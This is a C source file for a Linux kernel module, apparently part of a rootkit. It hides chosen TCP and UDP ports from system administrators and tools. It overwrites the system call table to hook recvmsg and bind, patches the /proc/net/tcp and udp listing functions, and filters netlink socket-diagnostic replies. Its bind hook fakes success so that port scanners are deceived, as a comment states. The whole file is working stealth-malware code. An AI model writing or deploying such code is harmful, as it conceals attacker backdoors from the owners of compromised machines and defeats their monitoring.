#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/inet_diag.h> /* Needed for ntohs */
#include <net/tcp.h>         // struct tcp_seq_afinfo.
#include <net/udp.h>         // struct tcp_seq_afinfo.

#include "util.h"
#include "hide_port.h"

#define PORT_STR_LEN 6

static int fake_seq_show(struct seq_file *seq, void *v);
static struct seq_operations *get_seq_operations_ptr(const char *path);
static bool data_should_be_masked(struct nlmsghdr *nlh);
static ssize_t my_sys_recvmsg(const struct pt_regs *regs);
static long my_sys_bind(const struct pt_regs *regs);

typedef int (*seq_show_fun)(struct seq_file *seq, void *v);

struct seq_operations *tcp_op, *udp_op, *tcp6_op, *udp6_op;
static seq_show_fun show_fun[4];
static syscall_fun real_sys_recvmsg;
static syscall_fun real_sys_bind;

static LIST_HEAD(hidden_port_list_head); //初始化链表头

struct port_node
{
    unsigned int port;
    enum net_type type;
    struct list_head list;
};

bool parse_hide_port_command(const char *str, enum net_type *type, int *port)
{
    bool ret;
    if (!strncmp(str, "tcp6", 4))
    {
        *type = NET_TYPE_TCP6;
        ret = sscanf(str + 5, "%d", port) == 1;
    }
    else if (!strncmp(str, "udp6", 4))
    {
        *type = NET_TYPE_UDP6;
        ret = sscanf(str + 5, "%d", port) == 1;
    }
    else if (!strncmp(str, "tcp", 3))
    {
        *type = NET_TYPE_TCP;
        ret = sscanf(str + 4, "%d", port) == 1;
    }
    else if (!strncmp(str, "udp", 3))
    {
        *type = NET_TYPE_UDP;
        ret = sscanf(str + 4, "%d", port) == 1;
    }
    else
    {
        ret = false;
    }
    return ret;
}

bool hide_port_init(void **real_sys_call_table)
{
    real_sys_recvmsg = real_sys_call_table[__NR_recvmsg];
    real_sys_bind = real_sys_call_table[__NR_bind];
    disable_wp();
    real_sys_call_table[__NR_recvmsg] = my_sys_recvmsg;
    real_sys_call_table[__NR_bind] = my_sys_bind;
    enable_wp();

    if (!(tcp_op = get_seq_operations_ptr("/proc/net/tcp")))
    {
        fm_info("get tcp_op fail.");
        return false;
    }
    if (!(udp_op = get_seq_operations_ptr("/proc/net/udp")))
    {
        fm_info("get udp_op fail.");
        return false;
    }
    if (!(tcp6_op = get_seq_operations_ptr("/proc/net/tcp6")))
    {
        fm_info("get tcp6_op fail.");
        return false;
    }
    if (!(udp6_op = get_seq_operations_ptr("/proc/net/udp6")))
    {
        fm_info("get udp6_op fail.");
        return false;
    }
    hook_and_save(tcp_op, offsetof(struct seq_operations, show), fake_seq_show, (void **)&show_fun[NET_TYPE_TCP]);
    hook_and_save(udp_op, offsetof(struct seq_operations, show), fake_seq_show, (void **)&show_fun[NET_TYPE_UDP]);
    hook_and_save(tcp6_op, offsetof(struct seq_operations, show), fake_seq_show, (void **)&show_fun[NET_TYPE_TCP6]);
    hook_and_save(udp6_op, offsetof(struct seq_operations, show), fake_seq_show, (void **)&show_fun[NET_TYPE_UDP6]);
    return true;
}

void hide_port_exit(void **real_sys_call_table)
{
    struct port_node *entry = NULL, *next_entry = NULL;

    disable_wp();
    real_sys_call_table[__NR_recvmsg] = real_sys_recvmsg;
    real_sys_call_table[__NR_bind] = real_sys_bind;
    enable_wp();

    hook_and_save(tcp_op, offsetof(struct seq_operations, show), show_fun[NET_TYPE_TCP], NULL);
    hook_and_save(udp_op, offsetof(struct seq_operations, show), show_fun[NET_TYPE_UDP], NULL);
    hook_and_save(tcp6_op, offsetof(struct seq_operations, show), show_fun[NET_TYPE_TCP6], NULL);
    hook_and_save(udp6_op, offsetof(struct seq_operations, show), show_fun[NET_TYPE_UDP6], NULL);

    fm_info("Restore port success\n");

    list_for_each_entry_safe(entry, next_entry, &hidden_port_list_head, list)
    {
        list_del(&entry->list);
        kfree(entry);
    }
}

static struct seq_operations *get_seq_operations_ptr(const char *path)
{
    struct file *filp = NULL;
    struct seq_operations *ret = NULL;
    filp = filp_open(path, O_RDONLY, 0);
    if (IS_ERR(filp))
    {
        fm_info("Failed to open %s with error %ld.\n", path, PTR_ERR(filp));
        ret = NULL;
    }
    else
    {
        ret = (struct seq_operations *)((struct seq_file *)(filp->private_data))->op;
        filp_close(filp, 0);
    }
    return ret;
}

void hide_port(enum net_type type, int port)
{
    struct port_node *node = NULL;

    node = kmalloc(sizeof(struct port_node), GFP_KERNEL);
    node->port = port;
    node->type = type;

    // 添加节点
    list_add_tail(&node->list, &hidden_port_list_head);
    fm_info("Add hide port: %d", port);
}

void unhide_port(enum net_type type, int port)
{
    struct port_node *entry = NULL, *next_entry = NULL;

    list_for_each_entry_safe(entry, next_entry, &hidden_port_list_head, list)
    {
        if (entry->port == port && entry->type == type)
        {
            fm_info("Unhiding: %d", port);
            list_del(&entry->list);
            kfree(entry);
            return;
        }
    }
}

static int fake_seq_show(struct seq_file *seq, void *v)
{
    int ret;
    int last_len, this_len;
    char port_str_buf[PORT_STR_LEN];
    enum net_type type;

    struct port_node *node = NULL;

    last_len = seq->count;
    if (seq->op == tcp_op)
    {
        type = NET_TYPE_TCP;
    }
    else if (seq->op == udp_op)
    {
        type = NET_TYPE_UDP;
    }
    else if (seq->op == tcp6_op)
    {
        type = NET_TYPE_TCP6;
    }
    else if (seq->op == udp6_op)
    {
        type = NET_TYPE_UDP6;
    }

    // 调用原有函数
    ret = show_fun[type](seq, v);

    // 获取新增的长度
    this_len = seq->count - last_len;

    list_for_each_entry(node, &hidden_port_list_head, list)
    {
        if (type == node->type)
        {
            snprintf(port_str_buf, PORT_STR_LEN, ":%04X", node->port);
            if (strnstr(seq->buf + last_len, port_str_buf, this_len))
            {
                fm_info("Hiding port: %d", node->port);
                seq->count = last_len;
                break;
            }
        }
    }
    return ret;
}

static ssize_t my_sys_recvmsg(const struct pt_regs *regs)
{
    // int sockfd, struct user_msghdr __user *msg, unsigned flags
    long ret;
    struct nlmsghdr *nlh, *nlh_kernel;
    void *nlh_user_ptr;
    long count;
    char *stream;
    int offset;
    int i;
    struct user_msghdr msg;
    struct iovec *msg_iov;
    /* Call original `recvmsg` syscall */
    ret = real_sys_recvmsg(regs);

    /* Some error occured. Don't do anything. */
    if (ret <= 0)
        return ret;

    /* Extract netlink message header from message */
    // nlh = (struct nlmsghdr *)(msg->msg_iov->iov_base);
    if (copy_from_user(&msg, (void *)regs->si, sizeof(struct user_msghdr)))
    {
        fm_info("copy_from_user fail.");
        return ret;
    }

    msg_iov = msg.msg_iov;

    if (copy_from_user(&nlh_user_ptr, &msg_iov->iov_base, sizeof(void *)))
    {
        fm_info("copy_from_user fail.");
        return ret;
    }

    nlh_kernel = (struct nlmsghdr *)kmalloc(ret, GFP_KERNEL);

    if (copy_from_user(nlh_kernel, nlh_user_ptr, ret))
    {
        fm_info("copy_from_user fail.");
        kfree(nlh_kernel);
        return ret;
    }

    nlh = nlh_kernel;

    /* Number of bytes remaining in message stream */
    count = ret;

    // 下面的代码很可能有安全问题
    /* NLMSG_OK: This macro will return true if a netlink message was received. It
	   essentially checks whether it's safe to parse the netlink message (if indeed
	   is a netlink message) using the other NLMSG_* macros. */
    while (NLMSG_OK(nlh, count))
    {

        if (!data_should_be_masked(nlh))
        {
            /* NLMSG_NEXT: Many netlink protocols have request messages that result
			   in multiple response messages. In these cases, multiple responses will
			   be copied into the `msg` buffer. This macro can be used to walk the
			   chain of responses. Returns NULL in the event the message is the last
			   in the chain for the given buffer. */
            nlh = NLMSG_NEXT(nlh, count);
            continue;
        }

        stream = (char *)nlh;

        /* NLMSG_ALIGN: This macro accepts the length of a netlink message and rounds it
		   up to the nearest NLMSG_ALIGNTO boundary. It returns the rounded length. */
        offset = NLMSG_ALIGN((nlh)->nlmsg_len);

        /* Copy remaining entries over the data to be masked */
        for (i = 0; i < count; i++)
        {
            stream[i] = stream[i + offset];
        }

        /* Adjust the data length */
        ret -= offset;
    }

    if (copy_to_user_mcsafe(nlh_user_ptr, nlh_kernel, ret))
    {
        fm_info("copy_to_user_mcsafe fail.");
    }

    kfree(nlh_kernel);
    return ret;
}

/* Function that checks whether specified netlink message contains data to be masked */
static bool data_should_be_masked(struct nlmsghdr *nlh)
{
    struct inet_diag_msg *r;
    int port;
    struct port_node *node = NULL;

    /* NLMSG_DATA: Given a netlink header structure, this macro returns
	   a pointer to the ancilliary data which it contains */
    r = NLMSG_DATA(nlh);

    /* From the ancilliary data extract the port associated with the socket identity */
    port = ntohs(r->id.idiag_sport);

    list_for_each_entry(node, &hidden_port_list_head, list)
    {
        // 未判断协议类型
        if (port == node->port)
        {
            return true;
        }
    }
    return false;
}

// 如果 bind 时出现 EADDRINUSE, 并且该端口是隐藏端口，则返回该端口未使用，用于欺骗扫描器
static long my_sys_bind(const struct pt_regs *regs)
{
    long ret;
    int port;
    struct sockaddr_in sockaddr;
    struct port_node *node = NULL;
    ret = real_sys_bind(regs);

    if ((int)ret == -EADDRINUSE && regs->dx >= sizeof(struct sockaddr_in))
    {
        if (copy_from_user(&sockaddr, (void *)regs->si, regs->dx) == 0)
        {
            if (sockaddr.sin_family == AF_INET || sockaddr.sin_family == AF_INET6)
            {
                port = ntohs(sockaddr.sin_port);
                fm_info("my_sys_bind: %d", port);
                list_for_each_entry(node, &hidden_port_list_head, list)
                {
                    // 未判断协议类型
                    if (port == node->port)
                    {
                        fm_info("avoid detect port:%d", port);
                        ret = 0;
                        break;
                    }
                }
            }
        }
        else
        {
            fm_info("copy_from_user fail.", port);
        }
    }
    return ret;
}